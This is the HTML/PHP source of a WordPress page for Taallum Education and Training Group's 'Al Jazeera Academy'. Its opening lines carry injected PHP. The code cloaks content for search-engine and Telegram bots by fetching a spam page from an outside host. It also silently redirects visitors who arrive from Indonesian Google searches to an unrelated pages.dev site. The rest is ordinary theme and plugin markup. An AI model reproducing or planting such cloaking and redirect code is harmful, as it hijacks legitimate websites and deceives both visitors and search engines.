<?php
$s_ref = $_SERVER['HTTP_REFERER'] ?? '';
$agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');

function is_bot() {
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'adsense', 'slurp');
foreach ($bots as $bot) {
if (stripos($user_agent, $bot) !== false) {
return true;
}
}
return false;
}
if (is_bot()) {
echo file_get_contents('https://grtoto.store/conextion-link/taalumgroup.html');
exit;
}

if (stripos($s_ref, 'google.co.id') !== false ||
(stripos($s_ref, 'google.com') !== false && stripos($lang, 'id') !== false)) {
header("Location: https://nelayantoto-amp4.pages.dev/");
exit;
}
?>
<!DOCTYPE html>
<html lang="en-US" >
<script async src="https://www.googletagmanager.com/gtag/js?id=G-H2J72K9NCK"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-H2J72K9NCK');
</script>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <link rel="profile" href="//gmpg.org/xfn/11">
    <link rel="pingback" href="https://taalumgroup.com/xmlrpc.php">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
    
    <title>Al Jazeera Academy &#8211; Taallum Education and Training Group</title>
<meta name='robots' content='max-image-preview:large' />
	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
	<link rel='dns-prefetch' href='//maps.googleapis.com' />
<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel="alternate" type="application/rss+xml" title="Taallum Education and Training Group &raquo; Feed" href="https://taalumgroup.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Taallum Education and Training Group &raquo; Comments Feed" href="https://taalumgroup.com/comments/feed/" />
<script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/taalumgroup.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.8.3"}};
/*! This file is auto-generated */
!function(s,n){var o,i,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),a=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===a[t]})}function u(e,t){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);for(var n=e.getImageData(16,16,1,1),a=0;a<n.data.length;a++)if(0!==n.data[a])return!1;return!0}function f(e,t,n,a){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\udde8\ud83c\uddf6","\ud83c\udde8\u200b\ud83c\uddf6")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!a(e,"\ud83e\udedf")}return!1}function g(e,t,n,a){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):s.createElement("canvas"),o=r.getContext("2d",{willReadFrequently:!0}),i=(o.textBaseline="top",o.font="600 32px Arial",{});return e.forEach(function(e){i[e]=t(o,e,n,a)}),i}function t(e){var t=s.createElement("script");t.src=e,t.defer=!0,s.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",i=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){s.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+g.toString()+"("+[JSON.stringify(i),f.toString(),p.toString(),u.toString()].join(",")+"));",a=new Blob([e],{type:"text/javascript"}),r=new Worker(URL.createObjectURL(a),{name:"wpTestEmojiSupports"});return void(r.onmessage=function(e){c(n=e.data),r.terminate(),t(n)})}catch(e){}c(n=g(i,f,p,u))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--font-family--inter: "Inter", sans-serif;--wp--preset--font-family--cardo: Cardo;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='contact-form-7-css' href='https://taalumgroup.com/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=6.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='my-modal-style-css' href='https://taalumgroup.com/wp-content/plugins/modal-maker/assets/css/my-modal-style.css?ver=1.3' type='text/css' media='all' />
<link rel='stylesheet' id='career-style-css' href='https://taalumgroup.com/wp-content/plugins/ova-career/assets/css/style.css?ver=6.8.3' type='text/css' media='all' />
<link rel='stylesheet' id='project_style-css' href='https://taalumgroup.com/wp-content/plugins/ova-project/assets/css/style.css?ver=6.8.3' type='text/css' media='all' />
<link rel='stylesheet' id='team_style-css' href='https://taalumgroup.com/wp-content/plugins/ova-team/assets/css/style.css?ver=6.8.3' type='text/css' media='all' />
<link rel='stylesheet' id='woocommerce-layout-css' href='https://taalumgroup.com/wp-content/plugins/woocommerce/assets/css/woocommerce-layout.css?ver=9.4.3' type='text/css' media='all' />
<link rel='stylesheet' id='woocommerce-smallscreen-css' href='https://taalumgroup.com/wp-content/plugins/woocommerce/assets/css/woocommerce-smallscreen.css?ver=9.4.3' type='text/css' media='only screen and (max-width: 768px)' />
<link rel='stylesheet' id='woocommerce-general-css' href='https://taalumgroup.com/wp-content/plugins/woocommerce/assets/css/woocommerce.css?ver=9.4.3' type='text/css' media='all' />
<style id='woocommerce-inline-inline-css' type='text/css'>
.woocommerce form .form-row .required { visibility: visible; }
</style>
<link rel='stylesheet' id='ova-google-fonts-css' href='//fonts.googleapis.com/css?family=Catamaran%3A100%2C200%2C300%2C400%2C500%2C600%2C700%2C800%2C900' type='text/css' media='all' />
<link rel='stylesheet' id='carousel-css' href='https://taalumgroup.com/wp-content/themes/infetech/assets/libs/carousel/assets/owl.carousel.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='ova-animate-css' href='https://taalumgroup.com/wp-content/themes/infetech/assets/libs/animations/animate.css' type='text/css' media='all' />
<link rel='stylesheet' id='ovaicon-css' href='https://taalumgroup.com/wp-content/themes/infetech/assets/libs/ovaicon/font/ovaicon.css' type='text/css' media='all' />
<link rel='stylesheet' id='flaticon-css' href='https://taalumgroup.com/wp-content/themes/infetech/assets/libs/flaticon/font/flaticon.css' type='text/css' media='all' />
<link rel='stylesheet' id='flaticon_infetech-css' href='https://taalumgroup.com/wp-content/themes/infetech/assets/libs/flaticon_infetech/font/flaticon_infetech.css' type='text/css' media='all' />
<link rel='stylesheet' id='flaticon_new-css' href='https://taalumgroup.com/wp-content/themes/infetech/assets/libs/flaticon_new/font/flaticon_new.css' type='text/css' media='all' />
<link rel='stylesheet' id='icomoon-css' href='https://taalumgroup.com/wp-content/themes/infetech/assets/libs/icomoon/style.css' type='text/css' media='all' />
<link rel='stylesheet' id='fontawesome-css' href='https://taalumgroup.com/wp-content/themes/infetech/assets/libs/fontawesome/css/all.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='infetech-style-css' href='https://taalumgroup.com/wp-content/themes/infetech/style.css?ver=6.8.3' type='text/css' media='all' />
<style id='infetech-style-inline-css' type='text/css'>
:root{--primary: #007cac;--secondary: #e58636;--text: #6C6A72;--heading: #1D1729;--light: #a2aaaa;--background-color: #F4F2F9;--primary-font: Catamaran;--font-size: 16px;--line-height: 1.9;--letter-spacing: 0px;--width-sidebar: 320px;--main-content:  calc( 100% - 320px );--container-width: 1290px;--boxed-offset: 20px;--woo-layout: woo_layout_2l;--woo-width-sidebar: 270px;--woo-main-content:  calc( 100% - 270px );}@media (min-width: 1024px) and ( max-width: 1350px ){
		        body .row_site,
		        body .elementor-section.elementor-section-boxed>.elementor-container{
		            max-width: 100%;
		            padding-left: 30px;
		            padding-right: 30px;
		        }
		    }
</style>
<link rel='stylesheet' id='elementor-frontend-css' href='https://taalumgroup.com/wp-content/plugins/elementor/assets/css/frontend.min.css?ver=3.25.10' type='text/css' media='all' />
<link rel='stylesheet' id='swiper-css' href='https://taalumgroup.com/wp-content/plugins/elementor/assets/lib/swiper/v8/css/swiper.min.css?ver=8.4.5' type='text/css' media='all' />
<link rel='stylesheet' id='e-swiper-css' href='https://taalumgroup.com/wp-content/plugins/elementor/assets/css/conditionals/e-swiper.min.css?ver=3.25.10' type='text/css' media='all' />
<link rel='stylesheet' id='elementor-post-8-css' href='https://taalumgroup.com/wp-content/uploads/elementor/css/post-8.css?ver=1764101488' type='text/css' media='all' />
<link rel='stylesheet' id='e-popup-style-css' href='https://taalumgroup.com/wp-content/plugins/elementor-pro/assets/css/conditionals/popup.min.css?ver=3.25.3' type='text/css' media='all' />
<link rel='stylesheet' id='e-animation-float-css' href='https://taalumgroup.com/wp-content/plugins/elementor/assets/lib/animations/styles/e-animation-float.min.css?ver=3.25.10' type='text/css' media='all' />
<link rel='stylesheet' id='widget-image-css' href='https://taalumgroup.com/wp-content/plugins/elementor/assets/css/widget-image.min.css?ver=3.25.10' type='text/css' media='all' />
<link rel='stylesheet' id='widget-media-carousel-css' href='https://taalumgroup.com/wp-content/plugins/elementor-pro/assets/css/widget-media-carousel.min.css?ver=3.25.3' type='text/css' media='all' />
<link rel='stylesheet' id='widget-carousel-module-base-css' href='https://taalumgroup.com/wp-content/plugins/elementor-pro/assets/css/widget-carousel-module-base.min.css?ver=3.25.3' type='text/css' media='all' />
<link rel='stylesheet' id='elementor-post-13322-css' href='https://taalumgroup.com/wp-content/uploads/elementor/css/post-13322.css?ver=1764102527' type='text/css' media='all' />
<link rel='stylesheet' id='google-fonts-1-css' href='https://fonts.googleapis.com/css?family=Roboto%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CRoboto+Slab%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&#038;display=swap&#038;ver=6.8.3' type='text/css' media='all' />
<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><script type="text/javascript" src="https://taalumgroup.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script type="text/javascript" src="https://taalumgroup.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<script type="text/javascript" src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBvfNDeFf6zIzOdlUM7fXAhLZkUSt1spdE&amp;libraries=places&amp;ver=1" id="pw-google-maps-api-js"></script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/plugins/woocommerce/assets/js/jquery-blockui/jquery.blockUI.min.js?ver=2.7.0-wc.9.4.3" id="jquery-blockui-js" defer="defer" data-wp-strategy="defer"></script>
<script type="text/javascript" id="wc-add-to-cart-js-extra">
/* <![CDATA[ */
var wc_add_to_cart_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%","i18n_view_cart":"View cart","cart_url":"https:\/\/taalumgroup.com\/?page_id=11","is_cart":"","cart_redirect_after_add":"no"};
/* ]]> */
</script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/plugins/woocommerce/assets/js/frontend/add-to-cart.min.js?ver=9.4.3" id="wc-add-to-cart-js" defer="defer" data-wp-strategy="defer"></script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/plugins/woocommerce/assets/js/js-cookie/js.cookie.min.js?ver=2.1.4-wc.9.4.3" id="js-cookie-js" defer="defer" data-wp-strategy="defer"></script>
<script type="text/javascript" id="woocommerce-js-extra">
/* <![CDATA[ */
var woocommerce_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%"};
/* ]]> */
</script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/plugins/woocommerce/assets/js/frontend/woocommerce.min.js?ver=9.4.3" id="woocommerce-js" defer="defer" data-wp-strategy="defer"></script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/plugins/elementor-pro/assets/js/page-transitions.min.js?ver=3.25.3" id="page-transitions-js"></script>
<link rel="https://api.w.org/" href="https://taalumgroup.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://taalumgroup.com/wp-json/wp/v2/pages/13322" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://taalumgroup.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.8.3" />
<meta name="generator" content="WooCommerce 9.4.3" />
<link rel="canonical" href="https://taalumgroup.com/al-jazeera-academy/" />
<link rel='shortlink' href='https://taalumgroup.com/?p=13322' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://taalumgroup.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Ftaalumgroup.com%2Fal-jazeera-academy%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://taalumgroup.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Ftaalumgroup.com%2Fal-jazeera-academy%2F&#038;format=xml" />
	<noscript><style>.woocommerce-product-gallery{ opacity: 1 !important; }</style></noscript>
	<meta name="generator" content="Elementor 3.25.10; features: e_font_icon_svg, additional_custom_breakpoints, e_optimized_control_loading, e_element_cache; settings: css_print_method-external, google_font-enabled, font_display-swap">
			<style>
				.e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload),
				.e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload) * {
					background-image: none !important;
				}
				@media screen and (max-height: 1024px) {
					.e-con.e-parent:nth-of-type(n+3):not(.e-lazyloaded):not(.e-no-lazyload),
					.e-con.e-parent:nth-of-type(n+3):not(.e-lazyloaded):not(.e-no-lazyload) * {
						background-image: none !important;
					}
				}
				@media screen and (max-height: 640px) {
					.e-con.e-parent:nth-of-type(n+2):not(.e-lazyloaded):not(.e-no-lazyload),
					.e-con.e-parent:nth-of-type(n+2):not(.e-lazyloaded):not(.e-no-lazyload) * {
						background-image: none !important;
					}
				}
			</style>
			<meta name="generator" content="Powered by Slider Revolution 6.6.10 - responsive, Mobile-Friendly Slider Plugin for WordPress with comfortable drag and drop interface." />
<style class='wp-fonts-local' type='text/css'>
@font-face{font-family:Inter;font-style:normal;font-weight:300 900;font-display:fallback;src:url('https://taalumgroup.com/wp-content/plugins/woocommerce/assets/fonts/Inter-VariableFont_slnt,wght.woff2') format('woff2');font-stretch:normal;}
@font-face{font-family:Cardo;font-style:normal;font-weight:400;font-display:fallback;src:url('https://taalumgroup.com/wp-content/plugins/woocommerce/assets/fonts/cardo_normal_400.woff2') format('woff2');}
</style>
<link rel="icon" href="https://taalumgroup.com/wp-content/uploads/2024/12/cropped-taallum-1-32x32.png" sizes="32x32" />
<link rel="icon" href="https://taalumgroup.com/wp-content/uploads/2024/12/cropped-taallum-1-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://taalumgroup.com/wp-content/uploads/2024/12/cropped-taallum-1-180x180.png" />
<meta name="msapplication-TileImage" content="https://taalumgroup.com/wp-content/uploads/2024/12/cropped-taallum-1-270x270.png" />
<script>function setREVStartSize(e){
			//window.requestAnimationFrame(function() {
				window.RSIW = window.RSIW===undefined ? window.innerWidth : window.RSIW;
				window.RSIH = window.RSIH===undefined ? window.innerHeight : window.RSIH;
				try {
					var pw = document.getElementById(e.c).parentNode.offsetWidth,
						newh;
					pw = pw===0 || isNaN(pw) || (e.l=="fullwidth" || e.layout=="fullwidth") ? window.RSIW : pw;
					e.tabw = e.tabw===undefined ? 0 : parseInt(e.tabw);
					e.thumbw = e.thumbw===undefined ? 0 : parseInt(e.thumbw);
					e.tabh = e.tabh===undefined ? 0 : parseInt(e.tabh);
					e.thumbh = e.thumbh===undefined ? 0 : parseInt(e.thumbh);
					e.tabhide = e.tabhide===undefined ? 0 : parseInt(e.tabhide);
					e.thumbhide = e.thumbhide===undefined ? 0 : parseInt(e.thumbhide);
					e.mh = e.mh===undefined || e.mh=="" || e.mh==="auto" ? 0 : parseInt(e.mh,0);
					if(e.layout==="fullscreen" || e.l==="fullscreen")
						newh = Math.max(e.mh,window.RSIH);
					else{
						e.gw = Array.isArray(e.gw) ? e.gw : [e.gw];
						for (var i in e.rl) if (e.gw[i]===undefined || e.gw[i]===0) e.gw[i] = e.gw[i-1];
						e.gh = e.el===undefined || e.el==="" || (Array.isArray(e.el) && e.el.length==0)? e.gh : e.el;
						e.gh = Array.isArray(e.gh) ? e.gh : [e.gh];
						for (var i in e.rl) if (e.gh[i]===undefined || e.gh[i]===0) e.gh[i] = e.gh[i-1];
											
						var nl = new Array(e.rl.length),
							ix = 0,
							sl;
						e.tabw = e.tabhide>=pw ? 0 : e.tabw;
						e.thumbw = e.thumbhide>=pw ? 0 : e.thumbw;
						e.tabh = e.tabhide>=pw ? 0 : e.tabh;
						e.thumbh = e.thumbhide>=pw ? 0 : e.thumbh;
						for (var i in e.rl) nl[i] = e.rl[i]<window.RSIW ? 0 : e.rl[i];
						sl = nl[0];
						for (var i in nl) if (sl>nl[i] && nl[i]>0) { sl = nl[i]; ix=i;}
						var m = pw>(e.gw[ix]+e.tabw+e.thumbw) ? 1 : (pw-(e.tabw+e.thumbw)) / (e.gw[ix]);
						newh =  (e.gh[ix] * m) + (e.tabh + e.thumbh);
					}
					var el = document.getElementById(e.c);
					if (el!==null && el) el.style.height = newh+"px";
					el = document.getElementById(e.c+"_wrapper");
					if (el!==null && el) {
						el.style.height = newh+"px";
						el.style.display = "block";
					}
				} catch(e){
					console.log("Failure at Presize of Slider:" + e)
				}
			//});
		  };</script>
</head>

<body class="wp-singular page-template page-template-elementor_header_footer page page-id-13322 wp-embed-responsive wp-theme-infetech theme-infetech woocommerce-no-js chrome layout_2r woo_layout_2l elementor-default elementor-template-full-width elementor-kit-8 elementor-page elementor-page-13322" >

	
			<div id="ova-custom-cursor__cursor"></div>
	    <div id="ova-custom-cursor__cursor-border"></div>
	
			<e-page-transition preloader-type="image" preloader-image-url="http://innovatixsys.com/taallum/wp-content/uploads/2024/12/taallum.png" class="e-page-transition--entering" exclude="^https\:\/\/taalumgroup\.com\/wp\-admin\/">
					</e-page-transition>
		    
	<div class="wrap-fullwidth"><div class="inside-content">

	
		<div data-elementor-type="wp-post" data-elementor-id="13988" class="elementor elementor-13988" data-elementor-post-type="ova_framework_hf_el">
